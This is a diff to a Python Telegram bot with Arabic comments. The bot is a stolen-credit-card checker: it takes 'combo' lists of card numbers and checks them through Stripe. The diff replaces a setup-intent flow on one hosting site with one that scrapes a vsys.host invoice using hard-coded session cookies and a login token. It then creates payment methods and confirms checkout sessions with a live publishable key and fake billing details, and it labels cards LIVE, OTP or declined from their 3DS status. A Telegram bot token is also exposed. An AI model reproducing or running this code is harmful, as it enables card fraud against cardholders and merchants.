@@ -4,9 +4,14 @@ import telebot
 from telebot import types
 import requests
 from bs4 import BeautifulSoup
+import urllib3
+import re
 import time
-from typing import Dict, List, Tuple
+from typing import Dict, List
 import threading
+
+# إخفاء تحذيرات SSL
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # بيانات البوت
 TOKEN = "8166484030:AAGiBsKby2GF0ykoxvkKMHCu80lHUIfD6xg"
@@ -36,90 +41,62 @@ def is_valid_bin(card_number):
     bin = card_number[:6]
     return bin.startswith('4') or bin.startswith(('51', '52', '53', '54', '55'))
 
-# رأس الطلبات للموقع
-cookies = {
-    '_gcl_au': '1.1.1927848327.1760870107',
-    '_ga': 'GA1.2.1045540598.1760870106',
-    '_gid': 'GA1.2.1507103315.1760870112',
-    '_fbp': 'fb.1.1760870112878.222051160650402702',
-    '_ga_L9P8FSN26L': 'GS2.1.s1760870106$o1$g0$t1760870168$j60$l0$h0',
-    '__adroll_fpc': 'aa50a5325b678cb2d9ebafc9b9965633-1760870171263',
-    'SESSID96d7': 'ee8a21f3362f9c69564a88690bbe106b',
-    '__stripe_mid': 'ee5b05ab-ac3a-4c88-b8a7-709c529ae0f01084d7',
-    '__stripe_sid': '8342b63d-2052-46ab-951b-2b5f3a84418bd6fe54',
-    'Cart-Session': 'ee8a21f3362f9c69564a88690bbe106b',
-}
-
-headers = {
-    'accept': '*/*',
-    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
-    'referer': 'https://cp.altushost.com/?/cart/',
-    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6793.65 Safari/537.36',
-    'x-csrf-token': '0084838b137a51695d5c2479fbfd7b13',
-    'x-requested-with': 'XMLHttpRequest',
-}
-
-# رأس الطلبات لـ Stripe
-stripe_headers = {
-    'accept': 'application/json',
-    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
-    'content-type': 'application/x-www-form-urlencoded',
-    'dnt': '1',
-    'origin': 'https://js.stripe.com',
-    'priority': 'u=1, i',
-    'referer': 'https://js.stripe.com/',
-    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="133", "Google Chrome";v="133"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-platform': '"Windows"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-site',
-    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6793.65 Safari/537.36',
-}
-
 # كلاس لفحص الكروت باستخدام Stripe
 class StripeChecker:
-    def __init__(self):
-        self.public_key = None
-        self.client_secret = None
+    def __init__(self, invoice_id):
+        self.invoice_id = invoice_id
+        self.session_id = None
+        self.total_amount = None
+        self.stripe_mid = None
+        self.stripe_sid = None
 
-    def fetch_stripe_keys(self) -> bool:
-        params = {'cmd': 'stripe_intents_3dsecure', 'action': 'cart'}
-        for attempt in range(3):
-            try:
-                response = requests.get('https://cp.altushost.com/', params=params, cookies=cookies, headers=headers)
-                response.raise_for_status()
-                soup = BeautifulSoup(response.text, "html.parser")
-                script_tags = soup.find_all("script")
-                
-                important_values = {}
-                for script in script_tags:
-                    if "Stripe(" in script.text:
-                        if "Stripe('" in script.text:
-                            start = script.text.find("Stripe('") + len("Stripe('")
-                            end = script.text.find("')", start)
-                            important_values["public_key"] = script.text[start:end]
-                        if "handleCardSetup(" in script.text:
-                            start = script.text.find("handleCardSetup(") + len("handleCardSetup(")
-                            part = script.text[start:].split(",")[0]
-                            important_values["client_secret"] = part.strip().strip('"')
-                
-                if not important_values.get("client_secret"):
-                    raise ValueError("Failed to extract client_secret")
-                self.public_key = important_values.get("public_key", "pk_live_88NPqxaecGYmZwJqsjzbKJkn")
-                self.client_secret = important_values["client_secret"]
-                return True
-            except Exception as e:
-                if attempt < 2:
-                    time.sleep(2 ** attempt)
-                    continue
-                print(f"{RED}Error fetching keys: {str(e)}{RESET}")
-                return False
+    def fetch_invoice_data(self) -> tuple:
+        url = f"https://vsys.host/viewinvoice.php?id={self.invoice_id}"
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Dest': 'document',
+        }
+        cookies = {
+            'WHMCSqCgI4rzA0cru': 'go71bn8nc22avq11bk86rfcmon',
+            'WHMCSlogin_auth_tk': 'R1BSNk1nZlBUYTZ0SzM2Z216Wm5wcVNlaUs1Y1BPRUk2RU54b0xJdVdtRzJyNUY4Uk9EajVLL0ZXTHUwRkRyNk44QWhvVHpVOHBKbTQwVE92UmxUTDlXaUR1SWJvQ3hnN3RONEl3VXFONWN1VEZOSFEycEtkMGlZZVRvZWZtbkZIbjlZTjI0NmNLbC9XbWJ4clliYllJejV4YThKTC9RMWZveld3Tm1UMHMxT3daalcrd296c1QxTVk1M3BTSHR0SzJhcmo4Z3hDSWZvVGx6QUZkV3E1QnFDbndHcEg4MXJrSGdwcnQ3WElwYWZnbkZBRVNoRnFvYnhOdE84WU1vd09sVUd0cjd4akJjdW54REVGVUNJcXNrQk5OMU50eWJWS3JMY1AwTm5LbmZHbmMwdEdMdTU3TDZ6cytWOERoczlRZ3BYbmNQaEJ5bUpYcnI3emd1OXhnZGxJVTV0TWV6dnRPRmxESjdDV1QxSWNZeFowMDFGcXlKelBmTXVQK0JuZkNsZHR5R2orNittMGNHeTF2V2tPWUtwUHVKNWxrZVVaSnFzUUE9PQ%3D%3D',
+            '_ga': 'GA1.1.1641871625.1761294273',
+            '_gcl_au': '1.1.1086970495.1761294272',
+            'VsysFirstVisit': '1761302393',
+            '_ga_248YG9EFT7': 'GS2.1.s1761302293$o3$g1$t1761302439$j48$l1$h530568902',
+        }
+        try:
+            session = requests.Session()
+            response = session.get(url, headers=headers, cookies=cookies, timeout=20, verify=False)
+            response.raise_for_status()
+            
+            new_cookies = session.cookies.get_dict()
+            self.stripe_mid = new_cookies.get('__stripe_mid', '0204b226-bf2c-4c98-83eb-5fa3551541ec16ac02')
+            self.stripe_sid = new_cookies.get('__stripe_sid', '2a9c20ed-7d36-46e6-9b81-95addca2ce147b8f82')
+            
+            soup = BeautifulSoup(response.text, 'html.parser')
+            m = re.search(r'https://checkout\.stripe\.com/[^\s\'"]+', response.text, flags=re.IGNORECASE)
+            self.session_id = m.group(0).split('/pay/')[1].split('#')[0] if m and '/pay/' in m.group(0) else ''
+            
+            total_row = soup.find('tr', class_='total-row') or soup.select_one('tr:contains("Total")')
+            if not total_row:
+                return False, "لم يتم العثور على المبلغ الإجمالي"
+            total_amount_text = total_row.find_all('td')[1].text.replace('$', '').strip()
+            self.total_amount = int(float(total_amount_text) * 100) if total_amount_text else 0
+            
+            if not self.session_id or not self.total_amount:
+                return False, "فشل جلب session_id أو المبلغ"
+            
+            return True, None
+        except Exception as e:
+            return False, f"خطأ في جلب بيانات الفاتورة: {str(e)[:50]}"
 
     def check_card(self, card: Dict, retry_count: int = 0) -> Dict:
-        time.sleep(2)  # تأخير قبل كل فحص
         start_time = time.time()
-
+        
         if not luhn_check(card['number']):
             return {
                 'status': 'ERROR',
@@ -136,129 +113,198 @@ class StripeChecker:
                 'time': round(time.time() - start_time, 2)
             }
 
-        # جلب client_secret جديد قبل كل فحص
-        if not self.fetch_stripe_keys():
+        success, error = self.fetch_invoice_data()
+        if not success:
             if retry_count < 2:
                 time.sleep(2)
                 return self.check_card(card, retry_count + 1)
             return {
                 'status': 'ERROR',
-                'message': 'Failed to fetch valid client_secret',
+                'message': f'Failed to fetch invoice data: {error}',
                 'details': {'status_3ds': 'N/A'},
                 'time': round(time.time() - start_time, 2)
             }
 
         try:
-            # أول طلب: تأكيد Setup Intent
-            for attempt in range(3):
-                try:
-                    data = f'payment_method_data[type]=card&payment_method_data[card][number]={card["number"]}&payment_method_data[card][cvc]={card["cvv"]}&payment_method_data[card][exp_month]={card["month"]}&payment_method_data[card][exp_year]={card["year"]}&payment_method_data[guid]=ebb2db58-111a-499c-b05b-ccd6bd7f4ed77d3fd8&payment_method_data[muid]=ee5b05ab-ac3a-4c88-b8a7-709c529ae0f01084d7&payment_method_data[sid]=8342b63d-2052-46ab-951b-2b5f3a84418bd6fe54&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F90ba939846%3B+stripe-js-v3%2F90ba939846%3B+card-element&payment_method_data[referrer]=https%3A%2F%2Fcp.altushost.com&payment_method_data[time_on_page]=358906&payment_method_data[client_attribution_metadata][client_session_id]=90971c9b-83d2-4fce-8987-13c246a80d9b&payment_method_data[client_attribution_metadata][merchant_integration_source]=elements&payment_method_data[client_attribution_metadata][merchant_integration_subtype]=card-element&payment_method_data[client_attribution_metadata][merchant_integration_version]=2017&expected_payment_method_type=card&use_stripe_sdk=true&key={self.public_key}&client_attribution_metadata[client_session_id]=90971c9b-83d2-4fce-8987-13c246a80d9b&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&client_secret={self.client_secret}'
-                    response = requests.post(
-                        f'https://api.stripe.com/v1/setup_intents/{self.client_secret.split("_secret_")[0]}/confirm',
-                        headers=stripe_headers,
-                        data=data,
-                    )
-                    setup_intent = response.json()
-                    break
-                except Exception as e:
-                    if attempt < 2:
-                        time.sleep(2 ** attempt)
-                        continue
-                    return {
-                        'status': 'ERROR',
-                        'message': f'Setup Intent Error - {str(e)}',
-                        'details': {'status_3ds': 'N/A'},
-                        'time': round(time.time() - start_time, 2)
-                    }
+            headers = {
+                'accept': 'application/json',
+                'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
+                'content-type': 'application/x-www-form-urlencoded',
+                'dnt': '1',
+                'origin': 'https://checkout.stripe.com',
+                'priority': 'u=1, i',
+                'referer': 'https://checkout.stripe.com/',
+                'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="133", "Google Chrome";v="133"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Windows"',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-site',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6793.65 Safari/537.36',
+            }
 
-            if 'error' in setup_intent:
-                error_message = setup_intent['error'].get('message', 'Unknown error')
-                if error_message.startswith('3D Secure 2 is not supported'):
-                    return {
-                        'status': 'DECLINED',
-                        'message': '❌ 3D Secure 2 Not Supported',
-                        'details': {'status_3ds': 'N/A'},
-                        'time': round(time.time() - start_time, 2)
-                    }
+            data_pm = (
+                f'type=card&card[number]={card["number"]}&card[cvc]={card["cvv"]}&'
+                f'card[exp_month]={card["month"]}&card[exp_year]={card["year"]}&'
+                'billing_details[name]=Card+details+saad&'
+                'billing_details[email]=renes98352%40neuraxo.com&'
+                'billing_details[address][country]=IT&'
+                'guid=ebb2db58-111a-499c-b05b-ccd6bd7f4ed77d3fd8&'
+                f'muid={self.stripe_mid}&'
+                f'sid={self.stripe_sid}&'
+                'key=pk_live_51GkRAEGiP3Mqp3aOunbt41L2O6DAAHnCW6DdpPPMIHOdPcYKBewOAP8MgyYRitVPmsiv8QggjFDDsQ16Xtr4SBPW00hdKd4Xgd&'
+                'payment_user_agent=stripe.js%2F6440ee8f22%3B+stripe-js-v3%2F6440ee8f22%3B+checkout&'
+                'client_attribution_metadata[client_session_id]=29bc83c3-2537-4d89-bedb-03ada15d3144&'
+                f'client_attribution_metadata[checkout_session_id]={self.session_id}&'
+                'client_attribution_metadata[merchant_integration_source]=checkout&'
+                'client_attribution_metadata[merchant_integration_version]=hosted_checkout&'
+                'client_attribution_metadata[payment_method_selection_flow]=automatic&'
+                'client_attribution_metadata[checkout_config_id]=52d1dd75-f056-4477-95cc-a57669140703'
+            )
+
+            r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data_pm, timeout=20)
+            pm_res = r1.json()
+
+            if 'id' not in pm_res:
+                error_msg = pm_res.get('error', {}).get('message', 'خطأ غير معروف')
                 return {
                     'status': 'ERROR',
-                    'message': f'Setup Intent Error - {error_message}',
+                    'message': f'Failed to create PM: {error_msg}',
                     'details': {'status_3ds': 'N/A'},
                     'time': round(time.time() - start_time, 2)
                 }
 
-            if setup_intent.get('status') == 'requires_action' and setup_intent.get('next_action', {}).get('type') == 'use_stripe_sdk':
-                three_d_secure_source = setup_intent.get('next_action', {}).get('use_stripe_sdk', {}).get('three_d_secure_2_source')
+            pm_id = pm_res['id']
 
-                # تاني طلب: تصديق 3DS2
-                for attempt in range(3):
-                    try:
-                        data = f'source={three_d_secure_source}&browser=%7B%22fingerprintAttempted%22%3Afalse%2C%22fingerprintData%22%3Anull%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22ar%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22786%22%2C%22browserScreenWidth%22%3A%221397%22%2C%22browserTZ%22%3A%22-180%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Windows+NT+10.0%3B+WOW64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F133.0.6793.65+Safari%2F537.36%22%7D&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=true&one_click_authn_device_support[webauthn_eligible]=true&one_click_authn_device_support[publickey_credentials_get_allowed]=true&key={self.public_key}'
-                        response = requests.post('https://api.stripe.com/v1/3ds2/authenticate', headers=stripe_headers, data=data)
-                        three_ds_response = response.json()
-                        break
-                    except Exception as e:
-                        if attempt < 2:
-                            time.sleep(2 ** attempt)
-                            continue
+            data_confirm = (
+                f'eid=NA&payment_method={pm_id}&expected_amount={self.total_amount}&'
+                f'last_displayed_line_item_group_details[subtotal]={self.total_amount}&'
+                'last_displayed_line_item_group_details[total_exclusive_tax]=0&'
+                'last_displayed_line_item_group_details[total_inclusive_tax]=0&'
+                'last_displayed_line_item_group_details[total_discount_amount]=0&'
+                'last_displayed_line_item_group_details[shipping_rate_amount]=0&'
+                'expected_payment_method_type=card&'
+                'guid=ebb2db58-111a-499c-b05b-ccd6bd7f4ed77d3fd8&'
+                f'muid={self.stripe_mid}&'
+                f'sid={self.stripe_sid}&'
+                'key=pk_live_51GkRAEGiP3Mqp3aOunbt41L2O6DAAHnCW6DdpPPMIHOdPcYKBewOAP8MgyYRitVPmsiv8QggjFDDsQ16Xtr4SBPW00hdKd4Xgd&'
+                'version=6440ee8f22&init_checksum=5tCZxAHSQW2HZsEpFgsH5M3JqPNl7lPM&'
+                'js_checksum=qto~d%5En0%3DQU%3Eazbu%5Db%5EbUTdPU~a_eToS%60%3DeP%7B%25%5E%3D%3F%24n%3CQ%5B%5E%5Eo%3FU%5E%60w&'
+                'client_attribution_metadata[client_session_id]=29bc83c3-2537-4d89-bedb-03ada15d3144&'
+                f'client_attribution_metadata[checkout_session_id]={self.session_id}&'
+                'client_attribution_metadata[merchant_integration_source]=checkout&'
+                'client_attribution_metadata[merchant_integration_version]=hosted_checkout&'
+                'client_attribution_metadata[payment_method_selection_flow]=automatic&'
+                'client_attribution_metadata[checkout_config_id]=52d1dd75-f056-4477-95cc-a57669140703'
+            )
+
+            r2 = requests.post(
+                f'https://api.stripe.com/v1/payment_pages/{self.session_id}/confirm',
+                headers=headers, data=data_confirm, timeout=20
+            )
+            confirm_res = r2.json()
+
+            if 'payment_intent' not in confirm_res:
+                if retry_count < 1:
+                    time.sleep(5)
+                    return self.check_card(card, retry_count + 1)
+                return {
+                    'status': 'ERROR',
+                    'message': 'No payment intent found',
+                    'details': {'status_3ds': 'N/A'},
+                    'time': round(time.time() - start_time, 2)
+                }
+
+            pi = confirm_res['payment_intent']
+            status = pi.get('status', 'unknown')
+
+            if status == 'requires_action':
+                next_action = pi.get('next_action', {})
+                if next_action.get('type') == 'use_stripe_sdk':
+                    use_stripe_sdk = next_action.get('use_stripe_sdk', {})
+                    source_id = use_stripe_sdk.get('three_d_secure_2_source')
+
+                    if not source_id:
                         return {
                             'status': 'ERROR',
-                            'message': f'3DS2 Authentication Error - {str(e)}',
+                            'message': 'No 3DS source found',
                             'details': {'status_3ds': 'N/A'},
                             'time': round(time.time() - start_time, 2)
                         }
 
-                trans_status = three_ds_response.get('ares', {}).get('transStatus')
-                acs_url = three_ds_response.get('ares', {}).get('acsURL')
+                    data_3ds = (
+                        f'source={source_id}&'
+                        'browser=%7B%22fingerprintAttempted%22%3Afalse%2C%22fingerprintData%22%3Anull%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22ar%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22786%22%2C%22browserScreenWidth%22%3A%221397%22%2C%22browserTZ%22%3A%22-180%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Windows+NT+10.0%3B+WOW64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F133.0.6793.65+Safari%2F537.36%22%7D&'
+                        'one_click_authn_device_support[hosted]=false&'
+                        'one_click_authn_device_support[same_origin_frame]=false&'
+                        'one_click_authn_device_support[spc_eligible]=true&'
+                        'one_click_authn_device_support[webauthn_eligible]=true&'
+                        'one_click_authn_device_support[publickey_credentials_get_allowed]=true&'
+                        'key=pk_live_51GkRAEGiP3Mqp3aOunbt41L2O6DAAHnCW6DdpPPMIHOdPcYKBewOAP8MgyYRitVPmsiv8QggjFDDsQ16Xtr4SBPW00hdKd4Xgd'
+                    )
 
-                details = {'status_3ds': trans_status or 'N/A'}
-                if trans_status == 'N':
-                    return {
-                        'status': 'LIVE',
-                        'message': '✅ Charged Successfully',
-                        'details': details,
-                        'time': round(time.time() - start_time, 2)
-                    }
-                elif trans_status in ('R', 'C') and acs_url:
-                    return {
-                        'status': 'OTP',
-                        'message': '🔐 3D Secure Challenge Required',
-                        'details': details,
-                        'time': round(time.time() - start_time, 2)
-                    }
-                elif trans_status in ('R', 'C') and not acs_url:
-                    return {
-                        'status': 'DECLINED',
-                        'message': '❌ Operation Rejected',
-                        'details': details,
-                        'time': round(time.time() - start_time, 2)
-                    }
+                    r3 = requests.post('https://api.stripe.com/v1/3ds2/authenticate', headers=headers, data=data_3ds, timeout=20)
+                    tds_res = r3.json()
+
+                    trans_status = tds_res.get('ares', {}).get('transStatus', '?')
+                    details = {'status_3ds': trans_status}
+
+                    if trans_status == 'N':
+                        return {
+                            'status': 'LIVE',
+                            'message': '✅ Live - transStatus: N',
+                            'details': details,
+                            'time': round(time.time() - start_time, 2)
+                        }
+                    elif trans_status == 'R':
+                        return {
+                            'status': 'DECLINED',
+                            'message': '❌ Rejected - transStatus: R',
+                            'details': details,
+                            'time': round(time.time() - start_time, 2)
+                        }
+                    elif trans_status == 'C':
+                        return {
+                            'status': 'OTP',
+                            'message': '🔐 Challenge - transStatus: C',
+                            'details': details,
+                            'time': round(time.time() - start_time, 2)
+                        }
+                    elif trans_status == 'Y':
+                        return {
+                            'status': 'LIVE',
+                            'message': '✅ Approved - transStatus: Y',
+                            'details': details,
+                            'time': round(time.time() - start_time, 2)
+                        }
+                    else:
+                        return {
+                            'status': 'ERROR',
+                            'message': f'❔ Unknown transStatus: {trans_status}',
+                            'details': details,
+                            'time': round(time.time() - start_time, 2)
+                        }
                 else:
-                    if retry_count < 1:  # إعادة محاولة مرة واحدة إذا كان N/A
-                        time.sleep(2)
-                        return self.check_card(card, retry_count + 1)
                     return {
                         'status': 'ERROR',
-                        'message': f'❔ Unknown 3DS Status: {trans_status or "N/A"}',
-                        'details': details,
+                        'message': f'Next action: {next_action.get("type", "unknown")}',
+                        'details': {'status_3ds': 'N/A'},
                         'time': round(time.time() - start_time, 2)
                     }
+            elif status == 'succeeded':
+                return {
+                    'status': 'LIVE',
+                    'message': '✅ Approved Direct',
+                    'details': {'status_3ds': 'N/A'},
+                    'time': round(time.time() - start_time, 2)
+                }
             else:
-                details = {'status_3ds': setup_intent.get('status', 'N/A')}
-                if setup_intent.get('status') == 'succeeded':
-                    return {
-                        'status': 'LIVE',
-                        'message': '✅ Setup Intent Confirmed Successfully',
-                        'details': details,
-                        'time': round(time.time() - start_time, 2)
-                    }
-                if retry_count < 1:  # إعادة محاولة مرة واحدة إذا فشل
-                    time.sleep(2)
-                    return self.check_card(card, retry_count + 1)
+                error = pi.get('last_payment_error', {})
+                error_msg = error.get('message', error.get('code', status))
                 return {
                     'status': 'ERROR',
-                    'message': 'Further Action Required or Setup Intent Failed',
-                    'details': details,
+                    'message': f'❌ {error_msg}',
+                    'details': {'status_3ds': 'N/A'},
                     'time': round(time.time() - start_time, 2)
                 }
         except Exception as e:
@@ -267,7 +313,7 @@ class StripeChecker:
                 return self.check_card(card, retry_count + 1)
             return {
                 'status': 'ERROR',
-                'message': f'Error - {str(e)}',
+                'message': f'Error: {str(e)[:50]}',
                 'details': {'status_3ds': 'N/A'},
                 'time': round(time.time() - start_time, 2)
             }
@@ -285,7 +331,7 @@ def start_message(message):
 🔒 Secure Processing
 💳 Only LIVE Cards Sent
 
-📤 Send your combo file or card details to start checking!
+📤 Send invoice ID and combo file or card details to start checking!
 ━━━━━━━━━━━━━━━━━━━━
 👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
 </b>"""
@@ -300,24 +346,29 @@ def handle_document(message):
         lines = downloaded_file.decode("utf-8").splitlines()
         
         cards = []
+        invoice_id = None
         for line in lines:
             line = line.strip()
-            if '|' in line:
+            if line.isdigit() and len(line) >= 6:  # Assuming invoice ID is a number with at least 6 digits
+                invoice_id = line
+            elif '|' in line and len(line.split('|')) == 4:
                 parts = line.split('|')
-                if len(parts) == 4:
-                    cards.append({
-                        'number': parts[0].strip(),
-                        'month': parts[1].strip().zfill(2),
-                        'year': parts[2].strip(),
-                        'cvv': parts[3].strip(),
-                        'raw': line
-                    })
+                cards.append({
+                    'number': parts[0].strip(),
+                    'month': parts[1].strip().zfill(2),
+                    'year': parts[2].strip(),
+                    'cvv': parts[3].strip(),
+                    'raw': line
+                })
         
+        if not invoice_id:
+            bot.reply_to(message, "❌ No invoice ID found in file!")
+            return
         if not cards:
             bot.reply_to(message, "❌ No valid cards found in file!")
             return
         
-        user_cards[user_id] = cards
+        user_cards[user_id] = {'invoice_id': invoice_id, 'cards': cards}
         checking_status[user_id] = False
         
         cc_count = len(cards)
@@ -329,6 +380,7 @@ def handle_document(message):
             text=f"""<b>✅ File Uploaded Successfully!
 ━━━━━━━━━━━━━━━━━━━━
 💳 Total Cards: {cc_count}
+📄 Invoice ID: {invoice_id}
 🔥 Gateway: Stripe 3DS
 ⚡ Status: Ready
 
@@ -342,15 +394,25 @@ Click below to start checking:
 @bot.message_handler(func=lambda message: True)
 def handle_text(message):
     text = message.text.strip()
-    if '|' in text and len(text.split('|')) == 4:
-        parts = text.split('|')
-        user_cards[message.from_user.id] = [{
-            'number': parts[0].strip(),
-            'month': parts[1].strip().zfill(2),
-            'year': parts[2].strip(),
-            'cvv': parts[3].strip(),
-            'raw': text
-        }]
+    parts = text.split('\n')
+    invoice_id = None
+    card = None
+    
+    if len(parts) >= 2:
+        if parts[0].isdigit() and len(parts[0]) >= 6:
+            invoice_id = parts[0]
+            if '|' in parts[1] and len(parts[1].split('|')) == 4:
+                card_parts = parts[1].split('|')
+                card = {
+                    'number': card_parts[0].strip(),
+                    'month': card_parts[1].strip().zfill(2),
+                    'year': card_parts[2].strip(),
+                    'cvv': card_parts[3].strip(),
+                    'raw': parts[1]
+                }
+    
+    if invoice_id and card:
+        user_cards[message.from_user.id] = {'invoice_id': invoice_id, 'cards': [card]}
         checking_status[message.from_user.id] = False
         
         keyboard = types.InlineKeyboardMarkup(row_width=2)
@@ -360,7 +422,8 @@ def handle_text(message):
             chat_id=message.chat.id,
             text=f"""<b>✅ Card Loaded!
 ━━━━━━━━━━━━━━━━━━━━
-💳 Card: <code>{parts[0][:6]}...{parts[0][-4:]}</code>
+💳 Card: <code>{card_parts[0][:6]}...{card_parts[0][-4:]}</code>
+📄 Invoice ID: {invoice_id}
 🔥 Gateway: Stripe 3DS
 ⚡ Status: Ready
 </b>""",
@@ -368,16 +431,20 @@ def handle_text(message):
         )
     else:
         bot.reply_to(message, """<b>❌ Invalid format!
-Use: Card|MM|YYYY|CVV
-Example: 5127740082586858|11|2028|155
+Use: 
+InvoiceID
+Card|MM|YYYY|CVV
+Example:
+260528
+5127740082586858|11|2028|155
 </b>""")
 
 @bot.callback_query_handler(func=lambda call: call.data == 'start_check')
 def start_checking(call):
     user_id = call.from_user.id
     
-    if user_id not in user_cards or not user_cards[user_id]:
-        bot.answer_callback_query(call.id, "❌ No cards loaded!")
+    if user_id not in user_cards or not user_cards[user_id]['cards']:
+        bot.answer_callback_query(call.id, "❌ No cards or invoice ID loaded!")
         return
     
     if checking_status.get(user_id, False):
@@ -391,16 +458,18 @@ def start_checking(call):
     thread.start()
 
 def check_cards_thread(user_id, message):
-    cards = user_cards[user_id]
+    data = user_cards[user_id]
+    cards = data['cards']
+    invoice_id = data['invoice_id']
     total = len(cards)
     
     bot.edit_message_text(
         chat_id=message.chat.id,
         message_id=message.message_id,
-        text="⏳ Initializing checker...\n🔑 Getting authorization keys..."
+        text="⏳ Initializing checker...\n🔑 Getting invoice data..."
     )
     
-    checker = StripeChecker()
+    checker = StripeChecker(invoice_id)
     live = otp = declined = errors = checked = key_attempts = na_count = 0
     wait_time = 60  # بداية الانتظار بدقيقة
     start_time = time.time()
@@ -411,17 +480,16 @@ def check_cards_thread(user_id, message):
         
         checked += 1
         result = checker.check_card(card)
-        key_attempts += 1  # زيادة عداد محاولات جلب المفاتيح
+        key_attempts += 1
         
-        # التحقق من N/A وإدارة الانتظار الديناميكي
         status_3ds = result.get('details', {}).get('status_3ds', 'N/A')
         if status_3ds == 'N/A':
             na_count += 1
         else:
-            na_count = 0  # إعادة تعيين العداد لو الكارت مش N/A
+            na_count = 0
         
         if na_count >= 5:
-            if wait_time > 3600:  # لو وصل لساعة
+            if wait_time > 3600:
                 bot.edit_message_text(
                     chat_id=message.chat.id,
                     message_id=message.message_id,
@@ -444,10 +512,9 @@ def check_cards_thread(user_id, message):
 </b>"""
             )
             time.sleep(wait_time)
-            wait_time *= 1  # تضاعف وقت الانتظار
-            na_count = 0  # إعادة تعيين العداد بعد الانتظار
+            wait_time *= 1
+            na_count = 0
         
-        # إنشاء زر لعرض نتيجة الفحص
         keyboard = types.InlineKeyboardMarkup(row_width=1)
         callback_data = f"show_result_{checked}"
         keyboard.add(
@@ -482,13 +549,12 @@ def check_cards_thread(user_id, message):
             otp += 1
         elif result['status'] == 'DECLINED':
             declined += 1
-            time.sleep(5)  # تأخير إضافي بعد DECLINED
+            time.sleep(5)
         else:
             errors += 1
-            time.sleep(5)  # تأخير إضافي بعد ERROR
+            time.sleep(5)
         
-        # تخزين نتيجة الكرت
-        user_cards[user_id][checked-1]['result'] = result
+        user_cards[user_id]['cards'][checked-1]['result'] = result
         
         progress = int((checked / total) * 20)
         progress_bar = f"[{'█' * progress}{'░' * (20 - progress)}] {int((checked / total) * 100)}%"
@@ -506,6 +572,7 @@ def check_cards_thread(user_id, message):
 {progress_bar}
 ⏱ ETA: {int(eta)}s | Speed: {speed:.1f} cps
 💳 Current: {card['number'][:6]}...{card['number'][-4:]}
+📄 Invoice ID: {invoice_id}
 🔑 Key Attempts: {key_attempts}
 ❔ N/A Count: {na_count}
 ⏱ Wait Time: {wait_time}s
@@ -515,9 +582,8 @@ def check_cards_thread(user_id, message):
         except:
             pass
         
-        time.sleep(2)  # تأخير بين كل فحص
+        time.sleep(2)
     
-    # النتيجة النهائية
     total_time = time.time() - start_time
     error_reason = "Completed successfully"
     if not checking_status.get(user_id, True):
@@ -560,11 +626,11 @@ def show_card_result(call):
     user_id = call.from_user.id
     index = int(call.data.split('_')[-1]) - 1
     
-    if user_id not in user_cards or index >= len(user_cards[user_id]):
+    if user_id not in user_cards or index >= len(user_cards[user_id]['cards']):
         bot.answer_callback_query(call.id, "❌ No result found!")
         return
     
-    card = user_cards[user_id][index]
+    card = user_cards[user_id]['cards'][index]
     result = card.get('result', {})
     details = result.get('details', {})
     
@@ -600,14 +666,16 @@ def help_message(message):
 /status - Check bot status
 
 📤 How to use:
-1. Send a combo file (.txt) or card details
+1. Send invoice ID and combo file or card details
 2. Click "Start Checking"
 3. Only LIVE cards sent, others via button
 
 📝 Combo Format:
+InvoiceID
 Card|MM|YYYY|CVV
 
 Example:
+260528
 5127740082586858|11|2028|155
 ━━━━━━━━━━━━━━━━━━━━
 👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
